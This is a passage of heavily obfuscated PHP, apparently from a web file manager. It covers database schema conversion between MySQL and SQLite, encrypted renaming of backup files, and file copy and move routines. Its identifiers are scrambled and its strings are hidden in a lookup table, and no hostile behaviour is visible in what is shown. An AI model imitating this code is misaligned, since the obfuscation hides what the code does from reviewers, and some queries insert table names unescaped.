$”Ä……Ç[1224]; $˜ÑÁ‘›Ó[] = sprintf($”Ä……Ç[1225], $”Ä……Ç[1226], $“–´™ğ¬, $”Ä……Ç[1227], $ó¢Áã©, $”Ä……Ç[1228], $ŸşÑ¸ì, $ã›ÚÏ€¹); } $›÷éËØª = array(); $«ÎÈŒ—€ = array($”Ä……Ç[1229] => $”Ä……Ç[400], $”Ä……Ç[1230] => $”Ä……Ç[400], $”Ä……Ç[374] => $”Ä……Ç[400], $”Ä……Ç[373] => $”Ä……Ç[400], $”Ä……Ç[1231] => $”Ä……Ç[1232], $”Ä……Ç[1233] => $”Ä……Ç[1232], $”Ä……Ç[1232] => $”Ä……Ç[1232], $”Ä……Ç[1234] => $”Ä……Ç[1232], $”Ä……Ç[293] => $”Ä……Ç[1232], $”Ä……Ç[1235] => $”Ä……Ç[1232], $”Ä……Ç[1236] => $”Ä……Ç[1232], $”Ä……Ç[1237] => $”Ä……Ç[1238], $”Ä……Ç[375] => $”Ä……Ç[1238], $”Ä……Ç[376] => $”Ä……Ç[1238], $”Ä……Ç[1239] => $”Ä……Ç[1239]); foreach ($È”«ä§ä as $–ôÚÎøê) { $º¨ëñ’Ó = _get($«ÎÈŒ—€, $–ôÚÎøê[$”Ä……Ç[1240]], $–ôÚÎøê[$”Ä……Ç[1241]]); $Ç“Òºó÷ = $–ôÚÎøê[$”Ä……Ç[1242]] == $”Ä……Ç[1006] ? $”Ä……Ç[1243] : $”Ä……Ç[1244]; $ÌÍìœì· = $–ôÚÎøê[$”Ä……Ç[1245]] == $ì„«Ë„Ğ ? $”Ä……Ç[1246] : $”Ä……Ç[12]; $Î©ìÖî± = $–ôÚÎøê[$”Ä……Ç[1060]] ? strtoupper(str_replace($”Ä……Ç[11], $”Ä……Ç[12], $–ôÚÎøê[$”Ä……Ç[1060]])) : $”Ä……Ç[12]; $›÷éËØª[] = sprintf($”Ä……Ç[1247], $–ôÚÎøê[$”Ä……Ç[1245]], $º¨ëñ’Ó, $Ç“Òºó÷, $ÌÍìœì·, $Î©ìÖî±); } $ĞıãÜÑ£ = array("\x44\x52\x4f\120\x20\x54\x41\x42\x4c\105\40\111\x46\x20\105\x58\x49\x53\124\123\40{$¥²ÌÔ}\x3b", "\x43\x52\x45\101\x54\x45\40\124\x41\102\x4c\x45\40{$¥²ÌÔ}\x20\50", implode($”Ä……Ç[60] . PHP_EOL, $›÷éËØª), $”Ä……Ç[1248]); $¹ä¹Â”¦ = implode(PHP_EOL, array_merge($ĞıãÜÑ£, $˜ÑÁ‘›Ó)); if ($º¨ëñ’Ó == $”Ä……Ç[23]) { return $¹ä¹Â”¦; } $©Ğû„¨´[$”Ä……Ç[23]] = $¹ä¹Â”¦; return $©Ğû„¨´; } public function sqlFromSqlite($—…Ë•Âñ, $¯‘ÒÂÑÉ = '') { $©ÑŸß…´ =& $_SERVER[ŒÅŸ‹ä†]; $÷ûİ¿˜¯ = array($©ÑŸß…´[900] => $©ÑŸß…´[12], $©ÑŸß…´[23] => $©ÑŸß…´[12]); $Î”†ÎÏ“ = $this->escapeName($—…Ë•Âñ); $»•Ã«Â« = $this->escapeName($—…Ë•Âñ, $©ÑŸß…´[23]); $‚İæ­ƒ = $this->model()->db(); $Ô”ûÌß = "\120\122\x41\107\x4d\x41\x20\x54\101\x42\x4c\x45\137\111\x4e\106\x4f\40\50\x27{$—…Ë•Âñ}\x27\51"; $‚—¸õÏ = "\x53\105\114\x45\103\x54\40\x2a\40\x46\x52\x4f\x4d\x20\163\161\154\x69\x74\x65\137\x6d\141\x73\x74\145\x72\x20\x57\110\x45\x52\105\x20\x74\142\154\x5f\x6e\x61\x6d\145\x20\75\x20\47{$—…Ë•Âñ}\x27"; $†»”ÉÉ = $‚İæ­ƒ->query($Ô”ûÌß); if (empty($†»”ÉÉ)) { return $¯‘ÒÂÑÉ ? $÷ûİ¿˜¯[$¯‘ÒÂÑÉ] : $÷ûİ¿˜¯; } $¶íû¾×¢ = $‚İæ­ƒ->query($‚—¸õÏ); $­é·“âú = $»Ê°• = array(); foreach ($¶íû¾×¢ as $À½‡ŠÕ) { if ($À½‡ŠÕ[$©ÑŸß…´[43]] == $©ÑŸß…´[367]) { $­é·“âú[] = $À½‡ŠÕ[$©ÑŸß…´[1249]]; } else { $»Ê°•[] = $À½‡ŠÕ[$©ÑŸß…´[1249]]; } } $®ÔşĞ¾¤ = array_merge(array("\104\122\117\x50\x20\x54\x41\x42\x4c\105\x20\111\x46\40\x45\130\x49\123\124\x53\40{$»•Ã«Â«}\73"), $­é·“âú, $»Ê°•); $®ÔşĞ¾¤ = implode($©ÑŸß…´[84] . PHP_EOL, $®ÔşĞ¾¤) . $©ÑŸß…´[84]; if ($¯‘ÒÂÑÉ == $©ÑŸß…´[23]) { return $®ÔşĞ¾¤; } $÷ûİ¿˜¯[$©ÑŸß…´[23]] = $®ÔşĞ¾¤; $Ú¹Éå±ò = $êÍâã» = array(); $Ò§¯µ” = array(); $è„ü›·‚ = array(); foreach ($¶íû¾×¢ as $À½‡ŠÕ) { if ($À½‡ŠÕ[$©ÑŸß…´[43]] == $©ÑŸß…´[1250]) { $çñÜÏµ = $À½‡ŠÕ[$©ÑŸß…´[1249]]; $¤‰¬ÉÌ… = stripos($çñÜÏµ, $©ÑŸß…´[1219]) !== !1; $é¶á ûâ = stripos($çñÜÏµ, $©ÑŸß…´[1213]) !== !1; preg_match($©ÑŸß…´[1251], $çñÜÏµ, $“æ¹®–³); if (empty($“æ¹®–³)) { continue; } $…Å¿ìÈ = array_map($©ÑŸß…´[1252], explode($©ÑŸß…´[60], $“æ¹®–³[1])); $“À¡Åñ = array(); foreach ($…Å¿ìÈ as $åñŠâ î) { $›òê±× = trim($åñŠâ î, $©ÑŸß…´[1253]); $“À¡Åñ[] = $›òê±×; $Ò§¯µ”[$›òê±×] = !0; } $è„ü›·‚[] = array($©ÑŸß…´[42] => $À½‡ŠÕ[$©ÑŸß…´[42]], $©ÑŸß…´[1249] => $çñÜÏµ, $©ÑŸß…´[1254] => $¤‰¬ÉÌ…, $©ÑŸß…´[1255] => $é¶á ûâ, $©ÑŸß…´[1256] => $“À¡Åñ); } } $Í°»¥Á® = array($©ÑŸß…´[1230] => $©ÑŸß…´[1230], $©ÑŸß…´[400] => $©ÑŸß…´[1257], $©ÑŸß…´[1238] => $©ÑŸß…´[1258], $©ÑŸß…´[1232] => $©ÑŸß…´[1232], $©ÑŸß…´[1239] => $©ÑŸß…´[1259], $©ÑŸß…´[1260] => $©ÑŸß…´[1261]); $ôÃ‹ŸÇ˜ = array($©ÑŸß…´[460], $©ÑŸß…´[179], $©ÑŸß…´[545]); $ĞìÅª = array($©ÑŸß…´[400], $©ÑŸß…´[1238], $©ÑŸß…´[1260], $©ÑŸß…´[1230]); foreach ($†»”ÉÉ as $À½‡ŠÕ) { $å€ı©“× = $À½‡ŠÕ[$©ÑŸß…´[42]]; $ÊàÏí“Š = strtolower($À½‡ŠÕ[$©ÑŸß…´[43]]); if ($ÊàÏí“Š == $©ÑŸß…´[1232] && isset($Ò§¯µ”[$å€ı©“×])) { $¯‘ÒÂÑÉ = in_array($å€ı©“×, $ôÃ‹ŸÇ˜) ? $©ÑŸß…´[1232] : $©ÑŸß…´[1262]; } else { $¯‘ÒÂÑÉ = _get($Í°»¥Á®, $ÊàÏí“Š, $ÊàÏí“Š); } if ($À½‡ŠÕ[$©ÑŸß…´[67]] > 0) { $êÍâã»[$À½‡ŠÕ[$©ÑŸß…´[67]]] = $å€ı©“×; } $©â¯Êõ§ = $©ÑŸß…´[12]; if ($À½‡ŠÕ[$©ÑŸß…´[66]] !== null) { $äÕÕƒÑ† = $À½‡ŠÕ[$©ÑŸß…´[66]]; if (in_array($ÊàÏí“Š, $ĞìÅª) && is_numeric($äÕÕƒÑ†)) { $©â¯Êõ§ = "\x44\x45\x46\x41\125\114\x54\40{$äÕÕƒÑ†}"; } else { if (strtolower($äÕÕƒÑ†) === $©ÑŸß…´[114]) { $©â¯Êõ§ = $À½‡ŠÕ[$©ÑŸß…´[45]] ? $©ÑŸß…´[12] : $©ÑŸß…´[1244]; } else { $Â«‡¯Ø = is_numeric($äÕÕƒÑ†) ? $äÕÕƒÑ† : $©ÑŸß…´[68] . addslashes($äÕÕƒÑ†) . $©ÑŸß…´[68]; $©â¯Êõ§ = "\x44\x45\106\x41\x55\x4c\124\x20{$Â«‡¯Ø}"; } } } $¸é“Ş” = $À½‡ŠÕ[$©ÑŸß…´[45]] ? $©ÑŸß…´[1243] : $©ÑŸß…´[1263]; $ÓË¨›å¨ = stripos($ÊàÏí“Š, $©ÑŸß…´[374]) !== !1 && $À½‡ŠÕ[$©ÑŸß…´[67]] ? $©ÑŸß…´[1264] : $©ÑŸß…´[12]; $Ú¹Éå±ò[] = sprintf($©ÑŸß…´[1265], $å€ı©“×, $¯‘ÒÂÑÉ, $¸é“Ş”, $©â¯Êõ§, $ÓË¨›å¨); } if (!empty($êÍâã»)) { ksort($êÍâã»); $œà£Åã• = $©ÑŸß…´[481] . implode($©ÑŸß…´[1185], $êÍâã») . $©ÑŸß…´[481]; $Ú¹Éå±ò[] = "\120\122\x49\x4d\101\122\x59\40\x4b\105\131\x20\x28{$œà£Åã•}\x29"; } foreach ($è„ü›·‚ as $Øï¸ˆà¢) { if ($Øï¸ˆà¢[$©ÑŸß…´[1255]]) { continue; } $’‹íàÕ = array(); foreach ($Øï¸ˆà¢[$©ÑŸß…´[1256]] as $åñŠâ î) { $Í°»¥Á® = null; foreach ($†»”ÉÉ as $ıœ³Åğè) { if ($ıœ³Åğè[$©ÑŸß…´[42]] == $åñŠâ î) { $Í°»¥Á® = strtolower($ıœ³Åğè[$©ÑŸß…´[43]]); break; } } if ($Í°»¥Á® == $©ÑŸß…´[1232] && in_array($åñŠâ î, $ôÃ‹ŸÇ˜)) { $’‹íàÕ[] = "\x60{$åñŠâ î}\x60\50\62\65\x30\x29"; } else { $’‹íàÕ[] = "\x60{$åñŠâ î}\140"; } } $ÊàÏí“Š = ($Øï¸ˆà¢[$©ÑŸß…´[1254]] ? $©ÑŸß…´[1266] : $©ÑŸß…´[12]) . $©ÑŸß…´[1267]; $Ä¼¤ä°Ñ = str_replace($©ÑŸß…´[1220] . $—…Ë•Âñ . $©ÑŸß…´[11], $©ÑŸß…´[12], $Øï¸ˆà¢[$©ÑŸß…´[42]]); $Ä¼¤ä°Ñ = str_replace($—…Ë•Âñ . $©ÑŸß…´[11], $©ÑŸß…´[12], $Ä¼¤ä°Ñ); $Ú¹Éå±ò[] = "{$ÊàÏí“Š}\40\x60{$Ä¼¤ä°Ñ}\x60\40\x28" . implode($©ÑŸß…´[60], $’‹íàÕ) . $©ÑŸß…´[1184]; } $Ã©Íıü› = array("\x44\122\117\120\x20\124\x41\102\x4c\105\x20\x49\x46\40\x45\x58\111\x53\x54\x53\40{$Î”†ÎÏ“}\73", "\103\x52\105\101\124\105\x20\x54\x41\102\114\x45\40{$Î”†ÎÏ“}\x20\x28", implode($©ÑŸß…´[60] . PHP_EOL, $Ú¹Éå±ò), $©ÑŸß…´[1268]); $Ã©Íıü› = implode(PHP_EOL, $Ã©Íıü›); if ($¯‘ÒÂÑÉ == $©ÑŸß…´[900]) { return $Ã©Íıü›; } $÷ûİ¿˜¯[$©ÑŸß…´[900]] = $Ã©Íıü›; return $÷ûİ¿˜¯; } private function escapeName($¼÷‘ç¾, $À»§Í÷ó = "\155\171\163\x71\x6c") { $’×Ñƒ–† =& $_SERVER[ŒÅŸ‹ä†]; $¼÷‘ç¾ = preg_replace($’×Ñƒ–†[1269], $’×Ñƒ–†[12], $¼÷‘ç¾); if ($À»§Í÷ó === $’×Ñƒ–†[900]) { return "\x60{$¼÷‘ç¾}\140"; } return "\x22{$¼÷‘ç¾}\42"; } public function mixBakList($‰´•¶ñ) { $»¤ÙÉÎı =& $_SERVER[ŒÅŸ‹ä†]; $‰´•¶ñ = rtrim($‰´•¶ñ, $»¤ÙÉÎı[8]) . $»¤ÙÉÎı[8]; $èßëÙû = $»¤ÙÉÎı[1270]; $Ò¨è•Ä« = IO::listPath($‰´•¶ñ); if (empty($Ò¨è•Ä«[$»¤ÙÉÎı[96]])) { return !1; } $À“Á×Ğ = array(); foreach ($Ò¨è•Ä«[$»¤ÙÉÎı[96]] as $¾·š™÷Í => $šßª†–ë) { if (!$šßª†–ë[$»¤ÙÉÎı[42]] || !$šßª†–ë[$»¤ÙÉÎı[97]]) { continue; } $Ãö¼éú = Mcrypt::encode($šßª†–ë[$»¤ÙÉÎı[42]], $èßëÙû); $ø£´ß’û = md5($Ãö¼éú); IO::rename($šßª†–ë[$»¤ÙÉÎı[97]], $ø£´ß’û); $À“Á×Ğ[$ø£´ß’û] = $Ãö¼éú; } $Ì¢ˆ¥Î = md5($»¤ÙÉÎı[1271] . $èßëÙû); IO::setContent($‰´•¶ñ . $Ì¢ˆ¥Î, json_encode($À“Á×Ğ)); return !0; } public function unmixBakList($üÛæİœ) { $ëşæÓîú =& $_SERVER[ŒÅŸ‹ä†]; $üÛæİœ = rtrim($üÛæİœ, $ëşæÓîú[8]) . $ëşæÓîú[8]; $»³´Ê = $this->unmixBakListGet($üÛæİœ, !0); if (empty($»³´Ê)) { return !1; } foreach ($»³´Ê as $Š†ùÌÂ† => $ãŠÍ³ŠÖ) { $¦ÓéÓàĞ = IO::rename($üÛæİœ . $ãŠÍ³ŠÖ, $Š†ùÌÂ†); if (!$¦ÓéÓàĞ) { return !1; } } return !0; } public function unmixBakListGet($ì¯‰ùìÖ, $†üê»Øø = false) { $À˜Şøöú =& $_SERVER[ŒÅŸ‹ä†]; $ì¯‰ùìÖ = rtrim($ì¯‰ùìÖ, $À˜Şøöú[8]) . $À˜Şøöú[8]; $Ğâº—µô = $À˜Şøöú[1270]; $ÂíÒà±Ø = md5($À˜Şøöú[1271] . $Ğâº—µô); $íÀ—´Ù¤ = $ì¯‰ùìÖ . $ÂíÒà±Ø; if (!IO::exist($íÀ—´Ù¤)) { return !1; } $ÚÃ—®·˜ = json_decode(IO::getContent($íÀ—´Ù¤), !0); if (empty($ÚÃ—®·˜)) { return !1; } $¯…ÁÏê» = array(); foreach ($ÚÃ—®·˜ as $êî¼æ™± => $÷—Ôã¡ª) { $ÂíÒà±Ø = Mcrypt::decode($÷—Ôã¡ª, $Ğâº—µô); $¯…ÁÏê»[$ÂíÒà±Ø] = $êî¼æ™±; } if ($†üê»Øø) { IO::remove($íÀ—´Ù¤, !1); } return $¯…ÁÏê»; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ôø´ªûŒ, $‰¯ÇÜ™‹) { $Ñ¸ıæóÏ =& $_SERVER[ŒÅŸ‹ä†]; $×ıæÒ¢Œ = $‰¯ÇÜ™‹; $GLOBALS[$Ñ¸ıæóÏ[1272]] = $Ñ¸ıæóÏ[1273] . $ôø´ªûŒ; Hook::trigger($Ñ¸ıæóÏ[1273] . $ôø´ªûŒ . $Ñ¸ıæóÏ[1274], $×ıæÒ¢Œ); $–Üï­øÂ = self::driverMake($‰¯ÇÜ™‹[0]); if (!$–Üï­øÂ) { return !1; } if ($ôø´ªûŒ == $Ñ¸ıæóÏ[646] || $ôø´ªûŒ == $Ñ¸ıæóÏ[648] || $ôø´ªûŒ == $Ñ¸ıæóÏ[1275]) { if (!trim($–Üï­øÂ->path . $Ñ¸ıæóÏ[472], $Ñ¸ıæóÏ[8])) { return !1; } } if (method_exists($–Üï­øÂ, $ôø´ªûŒ)) { $ä¡ÖïËã = @call_user_func_array(array($–Üï­øÂ, $ôø´ªûŒ), $‰¯ÇÜ™‹); } else { if (method_exists($–Üï­øÂ, $Ñ¸ıæóÏ[1276])) { $ä¡ÖïËã = @call_user_func_array(array($–Üï­øÂ, $ôø´ªûŒ), $‰¯ÇÜ™‹); } else { if (method_exists(self, $ôø´ªûŒ)) { $ä¡ÖïËã = @call_user_func_array(array(self, $ôø´ªûŒ), $‰¯ÇÜ™‹); } else { $ä¡ÖïËã = call_user_func_array(array(parent, $ôø´ªûŒ), $‰¯ÇÜ™‹); } } } Hook::trigger($Ñ¸ıæóÏ[1273] . $ôø´ªûŒ . $Ñ¸ıæóÏ[1277], $×ıæÒ¢Œ, $ä¡ÖïËã); return $ä¡ÖïËã; } public static function init($˜üøç¤Ò) { return self::driverMake($˜üøç¤Ò); } public static function copy($ıÀ¥ÛÚ¦, $“Ë´Ûš‹, $–¾”…‡Á = false, $ÖÆ÷¶ı• = false) { return self::copyMoveStart($ıÀ¥ÛÚ¦, $“Ë´Ûš‹, $–¾”…‡Á, $_SERVER[ŒÅŸ‹ä†][646], $ÖÆ÷¶ı•); } public static function move($”ğó×šÚ, $’ı¸ıÖæ, $èÙßıí‡ = false, $èø÷¯ÃŸ = false) { return self::copyMoveStart($”ğó×šÚ, $’ı¸ıÖæ, $èÙßıí‡, $_SERVER[ŒÅŸ‹ä†][648], $èø÷¯ÃŸ); } public static function copyMoveChildren($¿ÒÛœÄ, $ƒõ¾´â§, $“£²Ïá = "\x63\x6f\x70\x79", $³¿¥™îŞ = REPEAT_REPLACE) { $¼ßÌÎğÃ =& $_SERVER[ŒÅŸ‹ä†]; $¶“ìÅÓ = $¿ÒÛœÄ; $ÙÈä¨° = self::driverMake($¿ÒÛœÄ); $âÎ«…È = $ÙÈä¨°->listPath($¿ÒÛœÄ, !0); $¡­µŸ¤À = array_merge($âÎ«…È[$¼ßÌÎğÃ[96]], $âÎ«…È[$¼ßÌÎğÃ[95]]); foreach ($¡­µŸ¤À as $‡êè§Ğ…) { self::copyMoveStart($‡êè§Ğ…[$¼ßÌÎğÃ[97]], $ƒõ¾´â§, $³¿¥™îŞ, $“£²Ïá, !1); } if ($“£²Ïá == $¼ßÌÎğÃ[648]) { self::remove($¶“ìÅÓ); } } private static function copyMoveStart($Ó¡¢²², $­„Œ†Êñ, $¡Á£ó²ó, $šçá®³µ, $¦÷Õçúç) { $îŞîİ– =& $_SERVER[ŒÅŸ‹ä†]; $ÃÔ™¾á = array($Ó¡¢²², $­„Œ†Êñ, $¡Á£ó²ó, $¦÷Õçúç); Hook::trigger($îŞîİ–[1273] . $šçá®³µ . $îŞîİ–[1274], $ÃÔ™¾á); $×Æù¢şğ = self::copyMove($Ó¡¢²², $­„Œ†Êñ, $¡Á£ó²ó, $šçá®³µ, $¦÷Õçúç); Hook::trigger($îŞîİ–[1273] . $šçá®³µ . $îŞîİ–[1277], $ÃÔ™¾á, $×Æù¢şğ); return $×Æù¢şğ; } public static function saveFile($çªÚ¢âÊ, $À³á¸Ï¸, $ÅÂ§÷³ = true) { $’Ü›ì› =& $_SERVER[ŒÅŸ‹ä†]; $¹Û©ò¦ = self::info($À³á¸Ï¸); $¹èŸìê› = self::driverMake($çªÚ¢âÊ); $‰Ç©ÁÇ = self::driverMake($À³á¸Ï¸); $Ê’Îâøö = !1; if ($‰Ç©ÁÇ->pathParse[$’Ü›ì›[1278]]) { $Ê’Îâøö = $‰Ç©ÁÇ; $ëˆ„Í¢ï = $‰Ç©ÁÇ->pathParse[$’Ü›ì›[1278]]; $‰Ç©ÁÇ = self::driverMake($ëˆ„Í¢ï); } if ($¹èŸìê›->pathParse[$’Ü›ì›[1278]]) { $†ÙôçÌÌ = $¹èŸìê›->pathParse[$’Ü›ì›[1278]]; $¹èŸìê› = self::driverMake($†ÙôçÌÌ); } $Ò••Ğåı = $‰Ç©ÁÇ->pathFather($À³á¸Ï¸); $Ö›è‡–Û = !0; if (!$ÅÂ§÷³ && self::driverIsSame($¹èŸìê›, $‰Ç©ÁÇ)) { $Ö›è‡–Û = !1; } $¨øæ›ª× = self::copyFile($¹èŸìê›, $çªÚ¢âÊ, $‰Ç©ÁÇ, $Ò••Ğåı, $¹Û©ò¦[$’Ü›ì›[42]], $Ö›è‡–Û); if ($Ê’Îâøö) { $¨øæ›ª× = $Ê’Îâøö->getPathOuter($¨øæ›ª×); } return $¨øæ›ª×; } private static function copyMove($Øùœ´´ª, $²±ğµ„Œ, $¼ŒíÜÍ, $Åƒ°ÙÙ, $²Í©ˆ = false) { $»—¨º® =& $_SERVER[ŒÅŸ‹ä†]; if (!$Øùœ´´ª || $Øùœ´´ª == $»—¨º®[8] || !$²±ğµ„Œ) { return !1; } ignore_timeout(); $¬¯Ô ¯ = self::driverMake($Øùœ´´ª); $¡©¢­¡ = self::driverMake($²±ğµ„Œ); $½ºÑÈêñ = $Åƒ°ÙÙ == $»—¨º®[648]; $Ê†Ä°”Ó = !1; if ($¡©¢­¡->pathParse[$»—¨º®[1278]]) { $Ê†Ä°”Ó = $¡©¢­¡; $²±ğµ„Œ = $¡©¢­¡->pathParse[$»—¨º®[1278]]; $¡©¢­¡ = self::driverMake($²±ğµ„Œ); } if ($¬¯Ô ¯->pathParse[$»—¨º®[1278]]) { $Øùœ´´ª = $¬¯Ô ¯->pathParse[$»—¨º®[1278]]; $¬¯Ô ¯ = self::driverMake($Øùœ´´ª); } self::check($¬¯Ô ¯, $Øùœ´´ª, $¡©¢­¡, $²±ğµ„Œ); Hook::trigger($»—¨º®[1279], $¬¯Ô ¯, $Øùœ´´ª, $¡©¢­¡, $²±ğµ„Œ); $ÉğƒôÒ¼ = self::driverIsSame($¬¯Ô ¯, $¡©¢­¡); if ($ÉğƒôÒ¼) { if ($Åƒ°ÙÙ == $»—¨º®[648] && !method_exists($¡©¢­¡, $»—¨º®[1280]) && trim($²±ğµ„Œ, $»—¨º®[8]) == trim($¡©¢­¡->pathFather($Øùœ´´ª), $»—¨º®[8])) { if ($¬¯Ô ¯->pathThis($Øùœ´´ª) != $²Í©ˆ && !$¬¯Ô ¯->isOsDriver()) { return $¬¯Ô ¯->rename($Øùœ´´ª, $²Í©ˆ); } return $¡©¢­¡->getPathOuter($Øùœ´´ª); } if (method_exists($¡©¢­¡, $Åƒ°ÙÙ)) { return $¡©¢­¡->{$Åƒ°ÙÙ}($Øùœ´´ª, $²±ğµ„Œ, $¼ŒíÜÍ, $²Í©ˆ); } } if ($ÉğƒôÒ¼ && $Åƒ°ÙÙ == $»—¨º®[648] && $¡©¢­¡->getType() == $»—¨º®[117]) { $ªêâÒé = $¡©¢­¡->movePath($Øùœ´´ª, $²±ğµ„Œ, $²Í©ˆ); if ($ªêâÒé) { return $ªêâÒé; } } $Ú¾‡Æ²ì = $¬¯Ô ¯->isFile($Øùœ´´ª); if (!$Ú¾‡Æ²ì && $¡©¢­¡->getType() == $»—¨º®[854] && $¬¯Ô ¯->getType() == $»—¨º®[117]) { $ªêâÒé = $¡©¢­¡->copyFolderFromIO($¬¯Ô ¯, $Øùœ´´ª, $²±ğµ„Œ, $¼ŒíÜÍ, $½ºÑÈêñ, $²Í©ˆ); } else { $ªêâÒé = self::copyPath($¬¯Ô ¯, $Øùœ´´ª, $¡©¢­¡, $²±ğµ„Œ, $¼ŒíÜÍ, $½ºÑÈêñ, $Ú¾‡Æ²ì, $²Í©ˆ); } if ($ªêâÒé && $½ºÑÈêñ) { $¬¯Ô ¯->remove($Øùœ´´ª); } if ($Ê†Ä°”Ó) { $ªêâÒé = $Ê†Ä°”Ó->getPathOuter($ªêâÒé); } return $ªêâÒé; } private static function check($ùè½¡Ğ´, $çƒÓ¯”Ñ, $Ğ£å¾Ğ, &$Ÿˆ‹Æ¡Õ) { $¢éíªı¡ =& $_SERVER[ŒÅŸ‹ä†]; if (self::driverIsSame($ùè½¡Ğ´, $Ğ£å¾Ğ) && $ùè½¡Ğ´->isFolder($çƒÓ¯”Ñ) && $ùè½¡Ğ´->isParentOf($çƒÓ¯”Ñ, $Ÿˆ‹Æ¡Õ)) { show_json(LNG($¢éíªı¡[1281]), !1); } if (!$ùè½¡Ğ´->exist($çƒÓ¯”Ñ)) { show_json(LNG($¢éíªı¡[116]), !1); } } private static function copyPath($ëæ¡‚Ï§, $§Ö»ÒÃ°, $ÊÈöİê‚, $úŸ€ğ§, $îÀ¼æ±‚, $¸…®½˜, $”ìˆÃ„¤, $Ï²­˜ëî = false, $ª’Èƒ”¡ = true) { $ßû¸ÙÉç =& $_SERVER[ŒÅŸ‹ä†]; $éÎ÷ÂÓ… = empty($Ï²­˜ëî) && $Ï²­˜ëî !== $ßû¸ÙÉç[239] ? $ëæ¡‚Ï§->pathThis($§Ö»ÒÃ°) : $Ï²­˜ëî; if ($îÀ¼æ±‚) { $ˆúäğÆâ = $ÊÈöİê‚->fileNameExist($úŸ€ğ§, $éÎ÷ÂÓ…); $¬ÜƒØ× = $éÎ÷ÂÓ…; $éÎ÷ÂÓ… = $ÊÈöİê‚->fileNameAuto($úŸ€ğ§, $éÎ÷ÂÓ…, $îÀ¼æ±‚, !$”ìˆÃ„¤); if (!$ˆúäğÆâ || $¬ÜƒØ× != $éÎ÷ÂÓ…) { $îÀ¼æ±‚ = !1; } if ($ª’Èƒ”¡ && !$îÀ¼æ±‚) { $ÊÈöİê‚->_data[$ßû¸ÙÉç[1282]] = !0; } } if ($”ìˆÃ„¤) { return self::copyFile($ëæ¡‚Ï§, $§Ö»ÒÃ°, $ÊÈöİê‚, $úŸ€ğ§, $éÎ÷ÂÓ…, $¸…®½˜); } if ($îÀ¼æ±‚ == REPEAT_RENAME_FOLDER) { $îÀ¼æ±‚ = !1; } $„è¯¶û = rtrim($úŸ€ğ§, $ßû¸ÙÉç[8]) . $ßû¸ÙÉç[8] . $éÎ÷ÂÓ…; $˜¸†ÎøÂ = $ÊÈöİê‚->mkdir($ÊÈöİê‚->getPath($„è¯¶û), $îÀ¼æ±‚); $úŸ€ğ§ = $ÊÈöİê‚->getPathInner($˜¸†ÎøÂ); $ûú†ó²‘ = $ëæ¡‚Ï§->listPath($§Ö»ÒÃ°, !0); $ûú†ó²‘ = is_array($ûú†ó²‘) ? $ûú†ó²‘ : array($ßû¸ÙÉç[96] => array(), $ßû¸ÙÉç[95] => array()); $ª¡Ğ†©ê = array_merge($ûú†ó²‘[$ßû¸ÙÉç[96]], $ûú†ó²‘[$ßû¸ÙÉç[95]]); foreach ($ª¡Ğ†©ê as $ª­¹ãš•) { $ÆõŠëîÛ = $ª­¹ãš•[$ßû¸ÙÉç[43]] == $ßû¸ÙÉç[241]; $§Ö»ÒÃ° = $ëæ¡‚Ï§->getPathInner($ª­¹ãš•[$ßû¸ÙÉç[97]]); $ˆ£¤òŞ‚ = self::copyPath($ëæ¡‚Ï§, $§Ö»ÒÃ°, $ÊÈöİê‚, $úŸ€ğ§, $îÀ¼æ±‚, $¸…®½˜, $ÆõŠëîÛ, !1, !1); if (!$ˆ£¤òŞ‚) { IO::errorTips($ßû¸ÙÉç[1283] . $§Ö»ÒÃ° . $ßû¸ÙÉç[83] . $úŸ€ğ§); } } self::copyMoveKeepInfo($ëæ¡‚Ï§, $§Ö»ÒÃ°, $˜¸†ÎøÂ); return $˜¸†ÎøÂ; } private static function copyFile($¯™ÉıßÛ, $êûóÎÂ, $°»üÂìĞ, $Ç”õÏ„, $˜Ï„ôê, $ÇŸó‹Ê) { $ƒ®«Äã€ =& $_SERVER[ŒÅŸ‹ä†]; $Ç”õÏ„ = $°»üÂìĞ->getPath(rtrim($Ç”õÏ„, $ƒ®«Äã€[8]) . $ƒ®«Äã€[8] . $˜Ï„ôê); $ı¿–£š‹ = $ƒ®«Äã€[1284] . time() . rand_string(5); Hook::trigger($ƒ®«Äã€[1285], $¯™ÉıßÛ, $êûóÎÂ, $°»üÂìĞ, $Ç”õÏ„, $˜Ï„ôê, $ı¿–£š‹); if (self::driverIsSame($¯™ÉıßÛ, $°»üÂìĞ)) { if ($ÇŸó‹Ê) { $ò´ìİ‰Ó = $°»üÂìĞ->moveFile($êûóÎÂ, $Ç”õÏ„); } else { $ò´ìİ‰Ó = $°»üÂìĞ->copyFile($êûóÎÂ, $Ç”õÏ„); } Hook::trigger($ƒ®«Äã€[1286], $¯™ÉıßÛ, $êûóÎÂ, $°»üÂìĞ, $Ç”õÏ„, $˜Ï„ôê, $ò´ìİ‰Ó); self::copyMoveKeepInfo($¯™ÉıßÛ, $êûóÎÂ, $ò´ìİ‰Ó); return $ò´ìİ‰Ó; } $öòÏ½¹ = TEMP_FILES; if ($GLOBALS[$ƒ®«Äã€[6]][$ƒ®«Äã€[102]][$ƒ®«Äã€[897]]) { $öòÏ½¹ = $GLOBALS[$ƒ®«Äã€[6]][$ƒ®«Äã€[102]][$ƒ®«Äã€[897]]; } $²İÈù› = $öòÏ½¹; mk_dir($²İÈù›); $šÌÜ•ÆÆ = $²İÈù› . $ı¿–£š‹; $Ø×ÍÖ–Ê = $šÌÜ•ÆÆ; $šÌÜ•ÆÆ = $¯™ÉıßÛ->download($êûóÎÂ, $šÌÜ•ÆÆ); $šÌÜ•ÆÆ = $¯™ÉıßÛ->iconvApp($šÌÜ•ÆÆ); if (substr($šÌÜ•ÆÆ, strlen($öòÏ½¹)) == $öòÏ½¹) { $ÇŸó‹Ê = !0; } $ò´ìİ‰Ó = $°»üÂìĞ->upload($Ç”õÏ„, $šÌÜ•ÆÆ, $ÇŸó‹Ê); self::remove($Ø×ÍÖ–Ê); Hook::trigger($ƒ®«Äã€[1286], $¯™ÉıßÛ, $êûóÎÂ, $°»üÂìĞ, $Ç”õÏ„, $˜Ï„ôê, $ò´ìİ‰Ó); self::copyMoveKeepInfo($¯™ÉıßÛ, $êûóÎÂ, $ò´ìİ‰Ó); return $ò´ìİ‰Ó; } private static function copyMoveKeepInfo($Ÿàíøã“, $¨©äÅûÙ, $Ç·Ì¬ÒÍ) { if (!$Ç·Ì¬ÒÍ) { return; } $¸¶„É = $Ÿàíøã“->info($¨©äÅûÙ); if (!is_array($¸¶„É)) { return; } IO::setModifyTime($Ç·Ì¬ÒÍ, 